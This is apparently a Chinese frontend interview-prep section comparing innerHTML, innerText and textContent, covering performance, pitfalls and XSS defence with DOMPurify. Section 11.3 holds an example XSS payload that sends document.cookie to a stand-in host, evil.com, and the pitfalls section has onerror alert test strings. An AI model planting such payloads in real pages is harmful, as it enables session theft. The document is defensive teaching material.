# Section 11: innerHTML vs innerText vs textContent

## 11.1 概念定义

这三个属性都是 DOM 用来读取或更新元素内容的接口，但行为各异：

| 属性 | 定义 | 返回值 |
|------|------|--------|
| `innerHTML` | 读写元素内部的 HTML 标记（包括标签和文本） | 包含 HTML 标签的字符串 |
| `innerText` | 读写元素内部可见的文本（CSS 感知，会触发回流） | 仅可见文本，受 CSS 样式影响 |
| `textContent` | 读写元素及所有后代节点的纯文本（raw） | 所有文本，不含 HTML 标签 |

```html
<div id="demo">
  <span style="display:none">hidden</span>
  <span>visible</span>
</div>
```

```javascript
const el = document.getElementById('demo');
el.innerHTML    // "<span style="display:none">hidden</span><span>visible</span>"
el.innerText    // "visible"        (考虑CSS可见性，无缩进格式化)
el.textContent  // "hiddenvisible"  (包含隐藏内容，原样输出所有文本)
```

## 11.2 性能对比

```
+---------------------------+---------------------------+---------------------------+
|         innerHTML         |         innerText         |       textContent         |
+---------------------------+---------------------------+---------------------------+
| 1. 解析 HTML 标记         | 1. 读取计算样式           | 1. 直接读取 DOM 节点       |
| 2. 构建 DOM 树            | 2. 考虑 CSS 可见性        | 2. 递归拼接文本节点        |
| 3. 触发完整的解析/渲染    | 3. 触发回流(reflow)       | 3. 无额外计算，最快        |
|    (最慢)                 |    (中等)                 |    (最快)                 |
+---------------------------+---------------------------+---------------------------+
```

**性能实测规律（Chrome DevTools Performance 面板）：**
- `textContent` 写入：O(n)，纯文本拼接，无 DOM 解析
- `innerText` 读取：O(n) + 样式计算，每次触发 `getComputedStyle`
- `innerHTML` 写入：O(n) + HTML 解析器 + DOM 构建，大文档下慢 5-10x

**写入时的性能差异尤为显著：** 当频繁更新内容时，`textContent` 是最高效的选择。

## 11.3 安全：innerHTML XSS 漏洞与防护

### XSS 攻击原理

```javascript
// 攻击者注入恶意脚本
const userInput = '<img src=x onerror="fetch(`//evil.com?c=${document.cookie}`)">';
document.getElementById('app').innerHTML = userInput;
// 恶意脚本将随图片加载自动执行
```

### 防护方案

| 方案 | 说明 | 适用场景 |
|------|------|----------|
| DOMPurify | HTML 清洗库，过滤危险标签/属性 | 生产环境首选 |
| textContent 替代 | 完全不解析 HTML，攻击无效 | 仅需纯文本时 |
| 白名单正则过滤 | 自定义过滤逻辑 | 轻量级场景 |
| CSP Content-Security-Policy | 浏览器端安全策略 | 服务端配合 |

**DOMPurify 示例：**

```javascript
import DOMPurify from 'dompurify';

const dirty = userInput; // 不可信输入
const clean = DOMPurify.sanitize(dirty, {
  ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'p', 'br'],
  ALLOWED_ATTR: ['href'],
});
document.getElementById('app').innerHTML = clean;
```

```typescript
// React 中使用 DOMPurify
import DOMPurify from 'dompurify';

const SafeHTML = ({ html }: { html: string }) => {
  const sanitizer = typeof window !== 'undefined'
    ? DOMPurify.sanitize(html, { USE_PROFILES: { html: true } })
    : html;
  return <div dangerouslySetInnerHTML={{ __html: sanitizer }} />;
};
```

**React 中 `dangerouslySetInnerHTML` 的风险：**

```tsx
// 危险：将用户输入直接传入
<p dangerouslySetInnerHTML={{ __html: userInput }} />

// 安全：先清洗再使用
<p dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(userInput) }} />
```

## 11.4 现代替代方案

### insertAdjacentHTML / insertAdjacentText

```javascript
// 比 innerHTML 更细粒度地插入，效率更高
element.insertAdjacentHTML('beforeend', '<span>追加内容</span>');
element.insertAdjacentText('beforeend', '纯文本');
/*
beforebegin | <div>           | afterbegin
            | content         | beforeend
            | </div>          | afterend
afterend    |                 | beforebegin
*/
```

### 模板字面量（Template Literals）

```tsx
// React 函数组件
const UserCard = ({ name, avatar, bio }: UserProps) => (
  <div className="card">
    <img src={avatar} alt={name} />
    <h2>{name}</h2>
    <p>{bio}</p>
  </div>
);

// Vue 模板
const template = `<div class="card">
  <h2>${name}</h2>
  <p>${bio}</p>
</div>`;
```

**对比表格：**

| 场景 | 推荐方案 | 原因 |
|------|----------|------|
| 渲染用户提供的富文本 | DOMPurify + innerHTML | 需要保留格式但需防护 XSS |
| 渲染用户纯文本 | textContent | 最高效，无解析开销 |
| 需要获取样式感知文本 | innerText | 含 hidden 内容排除 |
| 细粒度插入节点 | insertAdjacentHTML | 比 innerHTML 效率高 |
| React/Vue 组件渲染 | JSX/Template | 框架级安全绑定 |

## 11.5 使用场景速查表

| 场景 | 选择 | 理由 |
|------|------|------|
| 向页面注入安全 HTML 片段 | DOMPurify.sanitize + innerHTML | 安全 + 保留格式 |
| 渲染纯文本内容 | textContent | 最高效，无 XSS 风险 |
| 获取用户看到的文本（含 CSS 效果） | innerText | 排除 `display:none` 等 |
| 动态替换整个元素内容 | innerHTML | 一次性替换 |
| 在元素末尾追加 HTML | insertAdjacentHTML | 局部插入，效率更高 |
| 在元素末尾追加纯文本 | insertAdjacentText | 局部插入，无 HTML 解析 |
| 搜索/过滤文本内容 | textContent | 最快，最准确 |
| 富文本编辑器 | contenteditable + 自定义 Model | 详见 Section 14 |

## 11.6 常见陷阱

```javascript
// 陷阱1: innerText 会受 display:none 影响
<div style="display:none">hidden text</div>
// innerText = ""（不可见文本被排除）
// textContent = "hidden text"（全部文本）

// 陷阱2: innerHTML 会执行 <script> 标签
el.innerHTML = '<script>alert(1)</script>'; // 不执行！
el.innerHTML = '<img src=x onerror="alert(1)">'; // 会执行！

// 陷阱3: innerText 在隐藏元素上读取返回空字符串
const hidden = document.createElement('div');
hidden.style.display = 'none';
hidden.textContent = 'foo';
hidden.innerText; // "" (Firefox/Chrome 均返回 "")
// textContent 始终返回 "foo"

// 陷阱4: 写入时 innerHTML 会丢失原有事件监听
const wrapper = document.getElementById('wrapper');
wrapper.innerHTML = '<button onclick="fn()">click</button>';
// 原 wrapper 上的事件监听全部丢失

// 陷阱5: IE 兼容性
// innerText: IE6+ 支持
// textContent: IE9+ 支持
// 需要兼容 IE8 时需做 polyfill
```

## 11.7 面试 follow-up 问题

### Q1: 如果一个 div 里有 `<span style="display:none">foo</span>bar`，三个属性的返回值分别是什么？为什么？

**答案：**
- `innerHTML` 返回完整 HTML 字符串：`<span style="display:none">foo</span>bar`
- `innerText` 返回可见文本（排除 hidden 内容）：`bar`
- `textContent` 返回所有文本节点：`foobar`

原因：`innerText` 是 CSS 感知的，会触发 `getComputedStyle`，不返回 `display:none` 元素的内容；`textContent` 是 raw 读取，遍历所有 Text 节点。

---

### Q2: 为什么说 React 的 `dangerouslySetInnerHTML` 是"危险的"？如何安全使用？

**答案：**
`dangerouslySetInnerHTML` 等同于直接操作 `innerHTML`，如果传入未经过滤的用户输入，会导致 DOM 型 XSS 攻击。安全使用方式：

```tsx
import DOMPurify from 'dompurify';

const sanitize = (html: string) => DOMPurify.sanitize(html);

const SafeContent = ({ html }: { html: string }) => (
  <div dangerouslySetInnerHTML={{ __html: sanitize(html) }} />
);
```

此外，现代编辑器（如 Tiptap、Lexical）采用自定义 Model 而非 `contenteditable`，从架构上规避了此类风险。

---

### Q3: 为什么频繁更新列表内容时推荐用 `textContent` 而不是 `innerHTML`？

**答案：**
`innerHTML` 每次写入都需要：
1. 字符串解析为 tokens
2. 构建临时 DOM 树
3. 计算样式（CSSOM）
4. 合并到主 DOM 树

而 `textContent` 只需将字符串直接写入 Text 节点，无解析过程。在 1000+ 条目的列表渲染中，`textContent` 比 `innerHTML` 快 5-10 倍，也更安全（无 XSS 风险）。

---

> 📚 参考：
> - https://blog.csdn.net/sunyctf/article/details/124873855 （innerHTML/innerText/textContent 区别）
> - https://blog.csdn.net/weixin_34184158/article/details/85584313 （innerHTML XSS 利用）
> - https://www.cnblogs.com/cybozu/p/17692802.html （DOMPurify 使用方法）
> - https://blog.csdn.net/qq_41444226/article/details/138995095 （DOMPurify XSS 防御）
> - https://www.cnblogs.com/delishcomcn/p/17645080.html （HTML5 拖拽事件）
